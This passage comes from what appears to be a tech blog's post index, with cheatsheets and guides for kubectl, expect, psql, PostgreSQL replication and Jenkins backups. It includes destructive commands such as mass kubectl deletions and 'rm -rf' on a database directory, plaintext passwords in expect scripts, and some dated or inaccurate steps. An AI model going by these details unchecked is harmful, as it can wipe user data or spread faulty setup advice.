deployment &lt;deployment-name&gt;        View deployment history.    kubectl rollout history deployment &lt;deployment-name&gt;        Rollback to a previous version.    kubectl rollout undo deployment &lt;deployment-name&gt;        Get all ReplicaSets.    kubectl get rs        Scale a deployment.    kubectl scale deployment &lt;deployment-name&gt; --replicas=3        Restart all pods in a deployment.    kubectl rollout restart deployment &lt;deployment-name&gt;        Show labels of deployments.    kubectl get deployments --show-labels        Delete all deployments.    kubectl delete deployment --all        Update container image in a deployment.    kubectl patch deployment &lt;deployment-name&gt; -p '{\"spec\":{\"template\":{\"spec\":{\"containers\":[{\"name\":\"&lt;container-name&gt;\",\"image\":\"nginx:latest\"}]}}}}'        Scale a deployment to zero.    kubectl scale --replicas=0 deployment/&lt;deployment-name&gt;        Get deployment names only.    kubectl get deployment -o=jsonpath='{.items[*].metadata.name}'        Update deployment image.    kubectl set image deployment/&lt;deployment-name&gt; &lt;container-name&gt;=nginx:latest        Patch a resource.    kubectl patch deployment &lt;deployment-name&gt; -p '{\"spec\":{\"replicas\":5}}'        Set resource requests/limits for a deployment.    kubectl set resources deployment &lt;deployment-name&gt; --limits=cpu=200m,memory=512Mi --requests=cpu=100m,memory=256Mi        Patch deployment label.    kubectl patch deployment &lt;deployment-name&gt; -p '{\"spec\":{\"template\":{\"metadata\":{\"labels\":{\"version\":\"v2\"}}}}}'        Pause a deployment rollout.    kubectl rollout pause deployment &lt;deployment-name&gt;        Resume a paused deployment rollout.    kubectl rollout resume deployment &lt;deployment-name&gt;        Annotate a deployment.    kubectl annotate deployment &lt;deployment-name&gt; kubernetes.io/change-cause=\"Updated image to v2\"      🌐 Services &amp; Networking  List all services.    kubectl get svc        List all services in all namespaces.    kubectl get svc -A        Get service details.    kubectl describe svc &lt;service-name&gt;        Delete a service.    kubectl delete svc &lt;service-name&gt;        Expose a deployment as a service.    kubectl expose deployment &lt;deployment-name&gt; --type=NodePort --port=80        List all service endpoints.    kubectl get endpoints        Forward local port to a pod.    kubectl port-forward pod/&lt;pod-name&gt; 8080:80        Start a proxy to access the API server.    kubectl proxy        List service names.    kubectl get services -o=jsonpath='{range .items[*]}{.metadata.name}{\"\\n\"}{end}'        Delete all services.    kubectl delete service --all        Change a service type.    kubectl patch svc &lt;service-name&gt; -p '{\"spec\": {\"type\": \"LoadBalancer\"}}'        Get LoadBalancer IP.    kubectl get svc &lt;service-name&gt; -o jsonpath='{.status.loadBalancer.ingress.ip}'        Get the NodePort of a service.    kubectl get svc &lt;service-name&gt; -o yaml | grep nodePort        Change service port mapping.    kubectl patch service &lt;service-name&gt; -p '{\"spec\":{\"ports\":[{\"port\":8080,\"targetPort\":80}]}}'        Forward a port to a deployment.    kubectl port-forward deployment/&lt;deployment-name&gt; 8080:80        Get services sorted by creation date.    kubectl get svc --sort-by=.metadata.creationTimestamp      🚦 Ingress &amp; Load Balancer  List all ingress resources.    kubectl get ingress        Get ingress details.    kubectl describe ingress &lt;ingress-name&gt;        Delete an ingress resource.    kubectl delete ingress &lt;ingress-name&gt;        Deploy an ingress rule.    kubectl apply -f ingress.yaml        Get Ingress external IP.    kubectl get ingress -o jsonpath='{.items[*].status.loadBalancer.ingress[*].ip}'        Get ingress names only.    kubectl get ingress -o=jsonpath='{.items[*].metadata.name}'        List all ingress hosts.    kubectl get ingress -o jsonpath='{range .items[*]}{.spec.rules[*].host}'        Edit an existing ingress rule.    kubectl edit ingress &lt;ingress-name&gt;        Delete all ingress rules.    kubectl delete ingress --all      ⚙️ ConfigMaps &amp; Secrets  List all ConfigMaps.    kubectl get configmaps        Get ConfigMap details.    kubectl describe configmap &lt;configmap-name&gt;        Create a ConfigMap.    kubectl create configmap &lt;config-name&gt; --from-literal=key=value        Delete a ConfigMap.    kubectl delete configmap &lt;configmap-name&gt;        List all secrets.    kubectl get secrets        Get secret details.    kubectl describe secret &lt;secret-name&gt;        Create a secret.    kubectl create secret generic &lt;secret-name&gt; --from-literal=key=value        View ConfigMap in YAML format.    kubectl get configmap &lt;configmap-name&gt; -o yaml        Decode secret value.    kubectl get secret &lt;secret-name&gt; -o jsonpath='{.data.&lt;key&gt;}' | base64 --decode        Edit an existing ConfigMap.    kubectl edit configmap &lt;configmap-name&gt;      🏳️‍🌈 Namespace Management  List all namespaces.    kubectl get namespaces        Create a new namespace.    kubectl create namespace &lt;namespace&gt;        Delete a namespace.    kubectl delete namespace &lt;namespace&gt;        List pods in a specific namespace.    kubectl get pods -n &lt;namespace&gt;        Set default namespace for the current context.    kubectl config set-context --current --namespace=&lt;namespace&gt;        Force delete a namespace.    kubectl delete namespace &lt;namespace&gt; --grace-period=0 --force        Get namespace names only.    kubectl get namespace -o=jsonpath='{.items[*].metadata.name}'      💾 Persistent Storage  List all Persistent Volumes.    kubectl get pv        List all Persistent Volume Claims.    kubectl get pvc        Get PV details.    kubectl describe pv &lt;pv-name&gt;        Get PVC details.    kubectl describe pvc &lt;pvc-name&gt;        View PV details.    kubectl get pv -o wide        List PVC names only.    kubectl get pvc -o jsonpath='{.items[*].metadata.name}'      🧰 StatefulSets &amp; DaemonSets  List all StatefulSets.    kubectl get statefulsets        Get StatefulSet details.    kubectl describe statefulset &lt;statefulset-name&gt;        List all DaemonSets.    kubectl get daemonsets        Get DaemonSet details.    kubectl describe daemonset &lt;daemonset-name&gt;        Restart a DaemonSet.    kubectl rollout restart daemonset &lt;daemonset-name&gt;      🐞 Events &amp; Debugging  List all events.    kubectl get events        Sort events by time.    kubectl get events --sort-by=.metadata.creationTimestamp        Debug a running pod.    kubectl debug pod/&lt;pod-name&gt; --image=busybox      🛡️ RBAC &amp; Security  List all roles.    kubectl get roles        List all role bindings.    kubectl get rolebindings        Get role details.    kubectl describe role &lt;role-name&gt;        List all cluster roles.    kubectl get clusterroles        List all cluster role bindings.    kubectl get clusterrolebindings      📊 Resource Management  View CPU &amp; memory usage of nodes.    kubectl top nodes        View CPU &amp; memory usage of pods.    kubectl top pods        Edit a live deployment.    kubectl edit deployment &lt;deployment-name&gt;        View Kubeconfig settings.    kubectl config view        List available Kubernetes contexts.    kubectl config get-contexts        Switch to a different context.    kubectl config use-context &lt;context-name&gt;      ⎈ Helm  List all Helm releases.    helm list        Install a Helm chart.    helm install &lt;name&gt; &lt;chart&gt;        Upgrade a Helm release.    helm upgrade &lt;name&gt; &lt;chart&gt;        Rollback a Helm release.    helm rollback &lt;name&gt; &lt;revision&gt;      ⏱️ Jobs &amp; CronJobs  List all jobs.    kubectl get jobs        Get job details.    kubectl describe job &lt;job-name&gt;        Delete a job.    kubectl delete job &lt;job-name&gt;        List all cron jobs.    kubectl get cronjobs        Delete a cron job.    kubectl delete cronjob &lt;cronjob-name&gt;      🛠️ Miscellaneous  Get documentation for pod resources.    kubectl explain pod        Run a temporary pod.    kubectl run --rm -it busybox -- /bin/sh        Test YAML before applying.    kubectl apply --dry-run=client -f &lt;file&gt;.yaml        Delete all resources in the namespace.    kubectl delete all --all        Delete all pods and services.    kubectl delete pod,svc --all        Delete all jobs.    kubectl delete jobs --all        Check component health.    kubectl get componentstatus        View certificate signing requests.    kubectl get csr        Drain a node with emptyDir cleanup.    kubectl drain &lt;node&gt; --delete-emptydir-data        Run a debug container.    kubectl run debug --image=busybox --restart=Never --rm -it -- /bin/sh        List all API resources.    kubectl api-resources        Get details of API services.    kubectl describe apiservices        Delete a CertificateSigningRequest.    kubectl delete csr &lt;csr-name&gt;        Explain pod spec structure.    kubectl explain pod.spec        Generate pod YAML.    kubectl run nginx --image=nginx --restart=Never --dry-run=client -o yaml        Update an environment variable in a deployment.    kubectl set env deployment/&lt;deployment-name&gt; CONFIG_VAR=value      "
  },
  
  {
    "title": "Automating Linux Interactions with Expect",
    "url": "/posts/expect/",
    "categories": "Linux",
    "tags": "Linux, Automation, Expect",
    "date": "2025-03-14 00:00:00 +0530",
    





    
    "snippet": "🛠️ Installing and Using expect in LinuxIntroductionexpect is a command-line tool used to automate interactions with programs that require user input. It is particularly useful when dealing with int...",
    "content": "🛠️ Installing and Using expect in LinuxIntroductionexpect is a command-line tool used to automate interactions with programs that require user input. It is particularly useful when dealing with interactive scripts or commands that require user intervention, such as SSH connections, FTP, and database systems. This guide will walk you through the process of installing expect on your Linux machine and demonstrate how to use it in different scenarios.📥 Installing expectTo get started, we first need to install expect on your Linux system. The installation process varies depending on the distribution you are using.For Ubuntu/Debian-based systems:To install expect, open your terminal and run the following command:sudo apt updatesudo apt install expectFor CentOS/RHEL-based systemsFor CentOS or RHEL, use the following command to install expect:sudo yum install expectFor Fedora systems:On Fedora, you can install expect with:sudo dnf install expectVerifying Installation:After installation, you can verify that expect has been installed by checking its version:expect -v🎯 Linux expect Command OptionsBelow is a table describing the available command options for the expect command:            Command      Description                  -c      Specifies the command to execute before the script.              -d      Provides a brief diagnostic output.              -D      Interactive debugger.              -f      Specifies a file to read from.              -i      Prompts commands interactively.              -b      Reads file line by line (buffer).              -v      Print version.      The expect command is commonly used for automating interactive applications, such as SSH logins, by simulating user inputs.📝 Basic Usage of expectexpect works by automating interactions with programs by scripting the responses. Here’s a basic structure of an expect script:#!/usr/bin/expect# Set timeout (optional)set timeout 20# Spawn a command (e.g., SSH login)spawn ssh user@hostname# Expect a specific promptexpect \"password:\"# Send the response (password)send \"your_password\\r\"# Interact with the sessioninteractExplanation:  spawn: This is used to start a new process or command, such as SSH or FTP.  expect: Waits for a specific pattern or string to appear in the output of the spawned process.  send: Sends a response to the spawned process.  interact: Allows the user to interact with the spawned session after the automation is complete🔐 Automating SSH Login with expectOne common use case for expect is automating SSH logins, especially when using ssh to connect to remote servers.Here’s an example script to automate SSH login:#!/usr/bin/expect# Set variablesset timeout 20set host \"your.server.com\"set user \"your_username\"set password \"your_password\"# Spawn the SSH commandspawn ssh $user@$host# Look for the password promptexpect \"password:\"# Send the passwordsend \"$password\\r\"# Interact with the sessioninteractTo use this script, simply save it to a file (e.g., ssh_login.expect), make it executable, and run it:chmod +x ssh_login.expect./ssh_login.expectNote:Storing passwords in plain text within scripts is not recommended for production environments due to security risks. Consider using SSH key-based authentication for more secure automation.⚙️ Automating File Transfer with expect (FTP)You can also use expect to automate FTP or SFTP commands. Here’s an example of automating an FTP login:#!/usr/bin/expect# Set variablesset timeout 20set host \"ftp.yourserver.com\"set user \"your_username\"set password \"your_password\"# Spawn FTP commandspawn ftp $host# Look for the username promptexpect \"Name:\"# Send the usernamesend \"$user\\r\"# Look for the password promptexpect \"Password:\"# Send the passwordsend \"$password\\r\"# Perform FTP operations (e.g., uploading a file)expect \"ftp&gt;\"send \"put /path/to/local/file /path/to/remote/file\\r\"# Exit FTPexpect \"ftp&gt;\"send \"bye\\r\"# Interact with the sessioninteract🛠️ Using expect in ScriptsYou can also integrate expect into larger shell scripts. For example, here’s how to automate multiple commands in a script:#!/bin/bash# Run first expect scriptexpect ./ssh_login.expect# Run second expect scriptexpect ./ftp_upload.expect# More commands as neededThis allows you to use expect for complex automation tasks that involve multiple programs and interactions.🐛 Debugging expect ScriptsIf you’re running into issues with your expect scripts, you can enable debugging by adding the following line at the beginning of your script:log_user 1This will print all interactions and outputs to the terminal, making it easier to troubleshoot problems.🔄 AutoexpectAutoexpect records your session and generates an Expect script based on your interactions.🔹 Step 1: Run Autoexpect with an Interactive ScriptLet’s assume we have a simple interactive script (interactive_script.sh) that asks for user input:#!/bin/bashecho \"Enter your username:\"read usernameecho \"Welcome, $username!\"Run Autoexpect with:autoexpect ./interactive_script.shThis will:  Execute the script.  Capture all interactions.  Save them into a new Expect script (script.exp).🔹 Step 2: Provide Input as RequiredFollow the script’s prompts, entering responses when needed. Autoexpect will capture everything.Once finished, you’ll see:Autoexpect generated \"script.exp\".🔹 Step 3: Review Generated ScriptOpen the generated script.exp file to see how Autoexpect translated the interaction into an Expect script:vim script.expYou’ll find an automatically created Expect script that replicates your session.Autoexpect is a powerful tool that eliminates the need for manually writing Expect scripts. By simply running your interactive tasks once, you generate a fully functional automation script, saving time and effort.📝 ConclusionExpect is a versatile tool for automating tasks that involve interactive terminal programs, such as SSH logins, Telnet sessions, or file transfers via SCP/FTP.By combining core commands like spawn, send, and expect, you can create powerful scripts to streamline repetitive tasks, saving time and reducing errors.For more advanced usage, refer to the official Expect documentation or explore community resources like Stack Overflow."
  },
  
  {
    "title": "psql",
    "url": "/posts/psql-cheatsheet/",
    "categories": "Cheatsheet",
    "tags": "cheatsheet",
    "date": "2025-03-09 00:00:00 +0530",
    





    
    "snippet": "Postgres CheatsheetThis is a collection of the most common commands I run while administering Postgres databases. The variables shown between the open and closed tags, “&lt;” and “&gt;”, should be ...",
    "content": "Postgres CheatsheetThis is a collection of the most common commands I run while administering Postgres databases. The variables shown between the open and closed tags, “&lt;” and “&gt;”, should be replaced with a name you choose. Postgres has multiple shortcut functions, starting with a forward slash, “\". Any SQL command that is not a shortcut, must end with a semicolon, “;”. You can use the keyboard UP and DOWN keys to scroll the history of previous commands you’ve run.Setupinstallation, Ubuntu Communitysudo echo \"deb http://apt.postgresql.org/pub/repos/apt/ wily-pgdg main\" &gt; \\  /etc/apt/sources.list.d/pgdg.listwget --quiet -O - https://www.postgresql.org/media/keys/ACCC4CF8.asc | sudo apt-key add -sudo apt-get updatesudo apt-get install -y postgresql-9.5 postgresql-client-9.5 postgresql-contrib-9.5sudo su - postgrespsqlconnectpsqlpsql -U &lt;username&gt; -d &lt;database&gt; -h &lt;hostname&gt;psql --username=&lt;username&gt; --dbname=&lt;database&gt; --host=&lt;hostname&gt;disconnect\\q\\!clear the screen(CTRL + L)info\\conninfoconfiguresudo nano $(locate -l 1 main/postgresql.conf)sudo service postgresql restartdebug logs# print the last 24 lines of the debug logsudo tail -24 $(find /var/log/postgresql -name 'postgresql-*-main.log')Reconshow versionSHOW SERVER_VERSION;show system status\\conninfoshow environmental variablesSHOW ALL;list usersSELECT rolname FROM pg_roles;show current userSELECT current_user;show current user’s permissions\\dulist databases\\lshow current databaseSELECT current_database();show all tables in database\\dtlist functions\\df &lt;schema&gt;Databaseslist databasees\\lconnect to database\\c &lt;database_name&gt;show current databaseSELECT current_database();create databaseCREATE DATABASE &lt;database_name&gt; WITH OWNER &lt;username&gt;;delete databaseDROP DATABASE IF EXISTS &lt;database_name&gt;;rename databaseALTER DATABASE &lt;old_name&gt; RENAME TO &lt;new_name&gt;;Userslist rolesSELECT rolname FROM pg_roles;create userCREATE USER &lt;user_name&gt; WITH PASSWORD '&lt;password&gt;';drop userDROP USER IF EXISTS &lt;user_name&gt;;alter user passwordALTER ROLE &lt;user_name&gt; WITH PASSWORD '&lt;password&gt;';Permissionsbecome the postgres user, if you have permission errorssudo su - postgrespsqlgrant all permissions on databaseGRANT ALL PRIVILEGES ON DATABASE &lt;db_name&gt; TO &lt;user_name&gt;;grant connection permissions on databaseGRANT CONNECT ON DATABASE &lt;db_name&gt; TO &lt;user_name&gt;;grant permissions on schemaGRANT USAGE ON SCHEMA public TO &lt;user_name&gt;;grant permissions to functionsGRANT EXECUTE ON ALL FUNCTIONS IN SCHEMA public TO &lt;user_name&gt;;grant permissions to select, update, insert, delete, on a all tablesGRANT SELECT, UPDATE, INSERT ON ALL TABLES IN SCHEMA public TO &lt;user_name&gt;;grant permissions, on a tableGRANT SELECT, UPDATE, INSERT ON &lt;table_name&gt; TO &lt;user_name&gt;;grant permissions, to select, on a tableGRANT SELECT ON ALL TABLES IN SCHEMA public TO &lt;user_name&gt;;Schemalist schemas\\dnSELECT schema_name FROM information_schema.schemata;SELECT nspname FROM pg_catalog.pg_namespace;create schemaCREATE SCHEMA IF NOT EXISTS &lt;schema_name&gt;;drop schemaDROP SCHEMA IF EXISTS &lt;schema_name&gt; CASCADE;Tableslist tables, in current db\\dtSELECT table_schema,table_name FROM information_schema.tables ORDER BY table_schema,table_name;list tables, globally\\dt *.*.SELECT * FROM pg_catalog.pg_tableslist table schema\\d &lt;table_name&gt;\\d+ &lt;table_name&gt;SELECT column_name, data_type, character_maximum_lengthFROM INFORMATION_SCHEMA.COLUMNSWHERE table_name = '&lt;table_name&gt;';create tableCREATE TABLE &lt;table_name&gt;(  &lt;column_name&gt; &lt;column_type&gt;,  &lt;column_name&gt; &lt;column_type&gt;);create table, with an auto-incrementing primary keyCREATE TABLE &lt;table_name&gt; (  &lt;column_name&gt; SERIAL PRIMARY KEY);delete tableDROP TABLE IF EXISTS &lt;table_name&gt; CASCADE;Columnsadd columnALTER TABLE &lt;table_name&gt; IF EXISTSADD &lt;column_name&gt; &lt;data_type&gt; [&lt;constraints&gt;];update columnALTER TABLE &lt;table_name&gt; IF EXISTSALTER &lt;column_name&gt; TYPE &lt;data_type&gt; [&lt;constraints&gt;];delete columnALTER TABLE &lt;table_name&gt; IF EXISTSDROP &lt;column_name&gt;;update column to be an auto-incrementing primary keyALTER TABLE &lt;table_name&gt;ADD COLUMN &lt;column_name&gt; SERIAL PRIMARY KEY;insert into a table, with an auto-incrementing primary keyINSERT INTO &lt;table_name&gt;VALUES (DEFAULT, &lt;value1&gt;);INSERT INTO &lt;table_name&gt; (&lt;column1_name&gt;,&lt;column2_name&gt;)VALUES ( &lt;value1&gt;,&lt;value2&gt; );Dataread all dataSELECT * FROM &lt;table_name&gt;;read one row of dataSELECT * FROM &lt;table_name&gt; LIMIT 1;search for dataSELECT * FROM &lt;table_name&gt; WHERE &lt;column_name&gt; = &lt;value&gt;;insert dataINSERT INTO &lt;table_name&gt; VALUES( &lt;value_1&gt;, &lt;value_2&gt; );edit dataUPDATE &lt;table_name&gt;SET &lt;column_1&gt; = &lt;value_1&gt;, &lt;column_2&gt; = &lt;value_2&gt;WHERE &lt;column_1&gt; = &lt;value&gt;;delete all dataDELETE FROM &lt;table_name&gt;;delete specific dataDELETE FROM &lt;table_name&gt;WHERE &lt;column_name&gt; = &lt;value&gt;;Scriptingrun local script, on remote hostpsql -U &lt;username&gt; -d &lt;database&gt; -h &lt;host&gt; -f &lt;local_file&gt;psql --username=&lt;username&gt; --dbname=&lt;database&gt; --host=&lt;host&gt; --file=&lt;local_file&gt;backup database data, everythingpg_dump &lt;database_name&gt;pg_dump &lt;database_name&gt;backup database, only datapg_dump -a &lt;database_name&gt;pg_dump --data-only &lt;database_name&gt;backup database, only schemapg_dump -s &lt;database_name&gt;pg_dump --schema-only &lt;database_name&gt;restore database datapg_restore -d &lt;database_name&gt; -a &lt;file_pathway&gt;pg_restore --dbname=&lt;database_name&gt; --data-only &lt;file_pathway&gt;restore database schemapg_restore -d &lt;database_name&gt; -s &lt;file_pathway&gt;pg_restore --dbname=&lt;database_name&gt; --schema-only &lt;file_pathway&gt;export table into CSV file\\copy &lt;table_name&gt; TO '&lt;file_path&gt;' CSVexport table, only specific columns, to CSV file\\copy &lt;table_name&gt;(&lt;column_1&gt;,&lt;column_1&gt;,&lt;column_1&gt;) TO '&lt;file_path&gt;' CSVimport CSV file into table\\copy &lt;table_name&gt; FROM '&lt;file_path&gt;' CSVimport CSV file into table, only specific columns\\copy &lt;table_name&gt;(&lt;column_1&gt;,&lt;column_1&gt;,&lt;column_1&gt;) FROM '&lt;file_path&gt;' CSVDebuggingUsing EXPLAINError Reporting and Logging"
  },
  
  {
    "title": "PostgreSQL Replication on Debian",
    "url": "/posts/postgresql/",
    "categories": "Linux",
    "tags": "Linux, Databases",
    "date": "2025-03-09 00:00:00 +0530",
    





    
    "snippet": "PostgreSQL is a powerful open-source relational database management system (RDBMS) that offers robust replication features. In this guide, we will set up master-slave replication on Debian, ensurin...",
    "content": "PostgreSQL is a powerful open-source relational database management system (RDBMS) that offers robust replication features. In this guide, we will set up master-slave replication on Debian, ensuring data is synchronized across servers for redundancy and high availability.🛠️ PrerequisitesBefore proceeding, ensure you have:  ✅ Two Debian-based servers (Master &amp; Slave)  ✅ PostgreSQL installed on both servers  ✅ SSH access with sudo privileges  ✅ Proper network connectivity between the servers  ✅ Static IP addresses assigned to both servers📥 Step 1: Install PostgreSQL on Both ServersRun the following commands on both Master and Slave servers:sudo apt update &amp;&amp; sudo apt install -y postgresql postgresql-contribOnce installed, verify the PostgreSQL service:sudo systemctl status postgresql🏗️ Step 2: Configure PostgreSQL on Master1️⃣ Edit postgresql.confModify the PostgreSQL configuration file on the Master Server  where XX is the version numbersudo nano /etc/postgresql/XX/main/postgresql.confUpdate the following parameters:listen_addresses = '*'  # Allows remote connectionswal_level = replica     # Enables replicationarchive_mode = on       # Enables WAL archivingarchive_command = 'cp %p /var/lib/postgresql/archive/%f'max_wal_senders = 10    # Defines maximum WAL senderswal_keep_size = 64MB    # Retains WAL segmentshot_standby = on        # \"off\" disallows queries during recoveryRestart PostgreSQL to apply changes:sudo systemctl restart postgresql2️⃣ Configure pg_hba confThe pg_hba.conf (PostgreSQL Host-Based Authentication) file is used to control client authentication in PostgreSQL. It defines who can connect, from where, and how they authenticate.Allow replication connections from the Slave Server:sudo nano /etc/postgresql/XX/main/pg_hba.conf🔷 Types of Authentication in PostgreSQL1️⃣ Trust  Description: Allows connections without a password.  Use Case: Only for local testing or environments with strict network isolation.    host all all 192.168.1.0/24 trust      2️⃣ MD5 (Hashed Password)  Description: Uses MD5-hashed passwords for authentication.  Use Case: Recommended for remote connections with password authentication.    host all all 192.168.1.0/24 md5        MD5 is considered weak by modern security standards. Use scram-sha-256 if possible.3️⃣ Password (Plaintext Password)  Description: Requires a plain-text password.  Use Case: Not recommended for security reasons sends unencrypted passwords over the network (not secure).    host all all 192.168.1.0/24 password      4️⃣ Scram-SHA-256 (Secure Hashed Authentication)  Description: Uses SHA-256 hashing (stronger than MD5).  Use Case: Recommended for secure remote authentication.    host all all 192.168.1.0/24 scram-sha-256        ✅ More secure than MD5 because it uses salted hashing and protects against brute-force attacks.  5️⃣ Peer (Linux User Mapping)  Description: Uses the system’s OS user for authentication.  Use Case: Secure local authentication on Unix/Linux.  PostgreSQL checks if the OS username matches the DB username.    local all all peer      6️⃣ Ident (Remote OS User Mapping)  Description: Uses an external Ident server to verify usernames.  Use Case: Used when clients and DB servers are on the same trusted network.  Maps OS users to database users.    host all all 192.168.1.0/24 ident      7️⃣ LDAP, Kerberos, PAM, SSPI, GSSAPI, Cert  Use Case: Enterprise environments needing single sign-on (SSO) or centralized authentication.    host all all 192.168.1.0/24 ldaphost all all 192.168.1.0/24 gss      Which Authentication Method Should You Use?            Method      Security      Best Use Case                  Trust      ❌ Insecure      Local testing only              MD5      🟡 Moderate      Legacy remote authentication              Password      ❌ Weak      Avoid if possible              Scram-SHA-256      ✅ Strong      Secure password authentication              Peer      ✅ Secure      Local authentication on Linux              Ident      🟡 Moderate      Trusted networks with Ident server              LDAP, Kerberos, PAM      ✅ Enterprise-grade      Large organizations needing SSO      Add the autheantication methhos depending upon your needs:host   Rule   User       Address      authenticationhost replication replicator &lt;SLAVE_IP&gt;/32 Scram-SHA-256Restart PostgreSQL again:sudo systemctl restart postgresql🔐 Step 3: Create a Replication UserCreate a dedicated user for replication:sudo -u postgres psql    (OR)su - postgres &amp;&amp; psqlWithin the PostgreSQL shell, execute:CREATE USER replicator REPLICATION LOGIN ENCRYPTED PASSWORD 'super_secure_password';Exit the PostgreSQL shell:\\q📥 Step 4: Configure the Slave Server1️⃣ Stop PostgreSQL ServiceRun the following command on the Slave Server:sudo systemctl stop postgresql2️⃣ Sync Data from MasterClear the existing data directory:  where XX is the version numbersudo mv /var/lib/postgresql/XX/main /var/lib/postgresql/XX/main_bak                      (or)sudo rm -rf /var/lib/postgresql/XX/main/*Sync data from the Master to the Slave using rsync:sudo -u postgres rsync -av --progress -e \"ssh -i ~/.ssh/id_rsa\" postgres@&lt;MASTER_IP&gt;:/var/lib/postgresql/XX/main/ /var/lib/postgresql/XX/main/        (OR)su - postgresrsync -laze \"ssh -p 22\" $USER$@$IP$:/var/lib/postgresql/15/main /var/lib/postgresql/15/      As we have used the rsync whcih dont have Streaming WAL Files options. rsync is useful for initial database syncs or backups, especially for large datasets. However, it needs more manual steps and is not suited for continuous replication.    For ongoing replication, Streaming WAL Files is the better choice as it provides real-time updates, is easy to set up, and requires less manual work. It’s ideal for high availability and scaling.    Use Streaming WAL Files for regular replication and rsync for one-time tasks or custom backups.  pg_basebackup -h &lt;master_ip&gt; -U replicator -p 5432 -D /var/lib/postgresql/&lt;version&gt;/main -v -X stream -C -S slaveslot1 -RSELECT * FROM pg_replication_slots;3️⃣ Create a Recovery Configuration FileCreate a standby.signal file:touch /var/lib/postgresql/XX/main/standby.signalCreate a postgresql.auto.conf file:sudo nano /var/lib/postgresql/XX/main/postgresql.auto.confAdd the following lines:primary_conninfo = 'host=&lt;MASTER_IP&gt; port=5432 user=replicator password=super_secure_password'4️⃣ Start PostgreSQL on SlaveRestart PostgreSQL on the Slave Server:sudo systemctl start postgresql🛠️ Step 5: Verify ReplicationOn the Master Server, run:sudo -u postgres psql -c \"SELECT * FROM pg_stat_replication;\"On the Slave Server, run:sudo -u postgres psql -c \"SELECT * FROM pg_stat_wal_receiver;\"If replication is working, you should see active WAL sender and receiver processes.🔥 Sync vs AsyncSynchronous vs Asynchronous Replication in PostgreSQLWhen setting up PostgreSQL replication, understanding the difference between synchronous and asynchronous replication is crucial. These two modes define how the primary (master) server and the standby (replica) server communicate and how transactions are managed across them.📡 Synchronous ReplicationIn synchronous replication, the primary server waits for the standby server to acknowledge that it has received and written the WAL (Write-Ahead Log) data before the transaction is considered committed. This ensures data consistency across servers and reduces the risk of data loss, as both the primary and replica are in sync after each transaction.  Pros:          Data Consistency: Guarantees that both primary and replica are always in sync.      Fault Tolerance: Lower risk of data loss in the event of a failure.        Cons:          Higher Latency: Transactions may experience a slight delay because the primary waits for the standby’s acknowledgment.      Performance Impact: Can slow down transactions, especially when the replica is located far away or is slower.      Use Case: Synchronous replication is ideal for mission-critical applications where data consistency and high availability are more important than performance.📡 Asynchronous ReplicationIn asynchronous replication, the primary server does not wait for the standby server to acknowledge the receipt of WAL data. The primary server commits the transaction immediately and continues without waiting for the replica to catch up. This results in faster transaction processing but introduces a risk of data loss if the primary server fails before the replica has received and written the data.  Pros:          Lower Latency: Transactions are faster since the primary doesn’t wait for the replica.      Better Performance: Especially beneficial when the replica is located remotely or when replication lag isn’t a major concern.        Cons:          Risk of Data Loss: If the primary fails, recent transactions may not have been replicated, leading to data inconsistency.      Replication Lag: The replica may not always be up-to-date with the primary server.      Use Case: Asynchronous replication is suitable for systems where performance is critical, and slight data inconsistency is acceptable, such as read-heavy applications or when using geographically distributed systems.The choice between synchronous and asynchronous replication depends on the needs of your application. If data integrity and consistency are paramount, then synchronous replication is the way to go. However, if performance and low latency are more important, asynchronous replication may be better suited for your use case.Edit the PostgreSQL Configuration on the Primary (Master) Server:sudo nano /etc/postgresql/&lt;version&gt;/main/postgresql.confsynchronous_standby_names = '*'sudo systemctl reload postgresqlsudo -u postgres psql -c \"SHOW synchronous_standby_names;\"🔄 Testing ReplicationTo confirm replication is working:  Create a test database on Master:    CREATE DATABASE testdb;        Check if it appears on Slave:    \\l      🔷 ConclusionYou have successfully configured PostgreSQL Master-Slave replication on Debian! This setup ensures redundancy, improves availability, and enhances disaster recovery. You can now further optimize this setup by implementing failover mechanisms and monitoring solutions.For a quick reference on PostgreSQL commands, check out the PostgreSQL Replication Cheatsheet  💡 Bonus Tip: Consider using tools like Patroni or pgpool-II for automatic failover.For further insights, stay tuned for more PostgreSQL tutorials and best practices!"
  },
  
  {
    "title": "Jenkins Rsync Backup & Discord Alerts",
    "url": "/posts/jenkins-backup/",
    "categories": "Linux",
    "tags": "Linux, Jenkins",
    "date": "2025-03-02 00:00:00 +0530",
    





    
    "snippet": "Prerequisites  Ensure Jenkins is installed and running.  Install the “Periodic Backup” plugin:          Go to Manage Jenkins &gt; Plugin Manager &gt; Available Plugins.      Search for “Periodic Ba...",
    "content": "Prerequisites  Ensure Jenkins is installed and running.  Install the “Periodic Backup” plugin:          Go to Manage Jenkins &gt; Plugin Manager &gt; Available Plugins.      Search for “Periodic Backup” and install it.      Restart Jenkins after installation.      ⚙️ Configuration Steps1️⃣ Access the Periodic Backup Manager  Navigate to Go to Jenkins Dashboard → Manage Jenkins  Scroll down to Periodic Backup Manager.2️⃣ Configure Basic SettingsClick on the Configure button within the Periodic Backup Manager and set the following parameters:📂 Temporary Directory  Specify a path for creating archives during backup, restoring archives, and unpacking their content. EG: /var/lib/jenkins/tmp  Ensure:          The directory is writable and empty.      It is located outside the Jenkins home directory to avoid data loss.      🕒 Backup Schedule (Cron)  Define when backups should occur using cron syntax.          Example: H 2 * * * (Runs at 2 AM daily).        Use the Validate Cron button to verify your schedule.🗑️ Maximum Backups in Location  Set the maximum number of backups to retain in each location. EG: 7  Older backups exceeding this limit will be deleted automatically.📅 Store No Older Than (Days)  Specify the retention period for backups in days.  Backups older than this value will be removed.3️⃣ File Management StrategyChoose a file management strategy:  Select a suitable FileManager  Fill in required fields as per your choice.4️⃣ Storage Strategy  storage strategies will help us to compress the data yusing you favourire compressions (eg: TarGzStorage ).  Fill in necessary details for each storage type.📍 Backup Location  Specify where backups should be stored (e.g., /var/backups/jenkins).  Use the Validate Path button to verify your directory has write access and ☑️ Enable this location  Avoid using paths inside the temporary directory to prevent data conflicts.💾 Save Configuration  Review all settings and ensure they are correct.  Click Save to apply changes.🔍 Testing the Configuration  Go back to the Periodic Backup Manager.  Click on Backup Now to initiate a manual backup.  Verify that a backup is created in the specified location.♻️ Restoring from Backup  Navigate to the Periodic Backup Manager.  Select the desired backup from the list of available backups.  Click on Restore and follow on-screen instructions.🌐 Upload Backup to SFTP1️⃣ Install the “Publish Over SSH” Plugin  Open Jenkins Dashboard.  Navigate to Manage Jenkins &gt; Manage Plugins.  In the Available tab, search for SSH Agent Plugin.  Select it and click Install without Restart.  Add the SFTP Credentials2️⃣ Create a Jenkins Free-Style Project  Go to Jenkins 